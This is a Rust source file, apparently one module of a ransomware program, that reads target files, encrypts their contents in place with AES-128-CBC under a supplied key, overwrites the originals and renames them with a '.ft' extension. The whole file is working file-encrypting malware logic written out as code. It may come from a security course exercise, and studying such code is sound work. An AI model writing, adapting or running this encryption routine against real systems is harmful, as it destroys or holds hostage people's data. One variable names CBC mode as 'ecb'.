use std::path::PathBuf;
use std::fs::rename;
use std::fs::File;
use std::fs::OpenOptions;
use std::io::{
    Read,
    Write
};
use openssl::symm::{encrypt, Cipher};
use rand::{Rng, thread_rng};
use crate::tools::Flags;

/* Does not work on different mountpoint, see rename doc */
pub fn rename_infect(path: &PathBuf) {
    if !path.is_file() {
        return ();
    }
    if let Some(path) = path.to_str() {
        let path_ft = path.to_owned() + ".ft";
        let _ = rename(path, path_ft);
    }
}

/*
 * Check key length and iv length
 * infect with AES
 * write content to file
 */
fn aes_infection(list: &Flags, buf_in: &mut Vec<u8>, file: &mut File) -> bool {
    let cipher_ecb = Cipher::aes_128_cbc();
    let key_bytes: &[u8] = list.key.as_bytes();
    let iv: [u8; 16] = [0u8; 16].map(|_|thread_rng().gen_range(0..255));

    if key_bytes.len() != iv.len() {
        eprintln!("Key and IV length must be equal.");
        return false;
    }
    if key_bytes.len() != 16{
        eprintln!("key length must be of 16 bytes.");
        return false;
    }
    let res_buf_out = encrypt(cipher_ecb, key_bytes, Some(&iv), buf_in);

    return match res_buf_out {
        Ok(mut ciphertext) => {
            if let Err(e) = file.set_len(0) {
                eprintln!("{e}");
                return false;
            }
            ciphertext.extend(iv);
            ciphertext.shrink_to_fit();
            if let Err(e) = file.write_all(&ciphertext) {
                eprintln!("{e}");
                return false;
            }
            if let Err(e) = file.sync_data() {
                eprintln!("{e}");
                return false;
            }
            true
        },
        Err(e) => {
            eprintln!("{e}");
            false
        }
    }
}

/*
 * Open file with rights
 * Append = true for padding issue in write_all()
 * Run infect
 * Rename file .ft
 */
pub fn infect(list: &Flags, path: &PathBuf) -> bool {
    let result_panic = std::panic::catch_unwind(||{
    let mut buf_in: Vec<u8> = Vec::new();
    if let Some(path_str) = path.to_str() {
        if let Ok(mut file) = OpenOptions::new()
                                .read(true)
                                .write(true)
                                .create(false)
                                .append(true)
        .open(path_str) {
            if let Ok(_) = file.read_to_end(&mut buf_in) {
                let res: bool = aes_infection(list, &mut buf_in, &mut file);

                if res {
                    rename_infect(&path);
                }
            } else {
                eprintln!("Couldn't read file.");
            }
        }
    }
    });
    match result_panic {
        Ok(_) => true,
        Err(_) => false
    }
}
